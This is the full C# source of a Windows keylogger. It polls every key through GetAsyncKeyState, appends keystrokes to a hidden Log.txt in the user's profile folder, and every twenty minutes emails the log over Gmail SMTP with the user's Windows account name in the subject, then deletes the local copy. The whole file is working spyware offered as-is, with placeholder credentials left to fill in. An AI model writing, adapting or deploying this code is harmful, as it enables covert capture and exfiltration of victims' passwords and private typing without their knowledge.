using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;

namespace Cvar1984
{
    namespace Logger
    {
        public class KeyLogger
        {
            [DllImport("user32.dll")]
            private static extern int GetAsyncKeyState(Int32 i); // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
            private string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";
            
            static void Main()
            {
                try
                {
                    Cvar1984.Logger.KeyLogger keylog = new Cvar1984.Logger.KeyLogger();

                    if (File.Exists(keylog.path))
                    {
                        File.SetAttributes(keylog.path, FileAttributes.Hidden);
                    }

                    Timer time = new Timer();
                    time.Interval = 60000 * 20;
                    time.Elapsed += keylog.sendEmail;
                    time.AutoReset = true;
                    time.Enabled = true;

                    while (true)
                    {
                        for (int x = 0; x < 255; x++)
                        {
                            int key = GetAsyncKeyState(x);

                            if (key == 1 || key == -32767)
                            {
                                StreamWriter file = new StreamWriter(keylog.path, true);
                                File.SetAttributes(keylog.path, FileAttributes.Hidden);
                                file.Write(keylog.verifyKey(x));
                                file.Close();
                                break;
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    //e.printStackTrace();
                }
            }

            private string verifyKey(int code)
            {
                string key = "";

                switch (code)
                {
                    case 8:
                        key = "[Back]";
                        break;
                    case 9:
                        key = "[TAB]";
                        break;
                    case 13:
                        key = "[Enter]";
                        break;
                    case 19:
                        key = "[Pause]";
                        break;
                    case 20:
                        key = "[Caps Lock]";
                        break;
                    case 27:
                        key = "[Esc]";
                        break;
                    case 32:
                        key = "[Space]";
                        break;
                    case 33:
                        key = "[Page Up]";
                        break;
                    case 34:
                        key = "[Page Down]";
                        break;
                    case 35:
                        key = "[End]";
                        break;
                    case 36:
                        key = "[Home]";
                        break;
                    case 37:
                        key = "[Left]";
                        break;
                    case 38:
                        key = "[Up]";
                        break;
                    case 39:
                        key = "[Right]";
                        break;
                    case 40:
                        key = "[Down]";
                        break;
                    case 44:
                        key = "[Print Screen]";
                        break;
                    case 45:
                        key = "[Insert]";
                        break;
                    case 46:
                        key = "[Delete]";
                        break;
                    case 91:
                        key = "[Windows]";
                        break;
                    case 92:
                        key = "[Windows]";
                        break;
                    case 93:
                        key = "[List]";
                        break;
                    case 112:
                        key = "[F1]";
                        break;
                    default:
                        key = "[" + code + "]";
                        break;
                }
                // such a pain in the ass
                return key;
            }

            private void sendEmail(Object source, ElapsedEventArgs e)
            {
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("email");
                mail.To.Add("dest");
                mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;

                if (!File.Exists(path)) {
                    return;
                }
                
                StreamReader r = new StreamReader(path);
                String content = r.ReadLine();
                r.Close();
                File.Delete(path);
                mail.Body = content;

                server.Port = 587;
                server.Credentials = new NetworkCredential("email", "password");
                server.EnableSsl = true;
                server.Send(mail);
            }
        }
    }
}
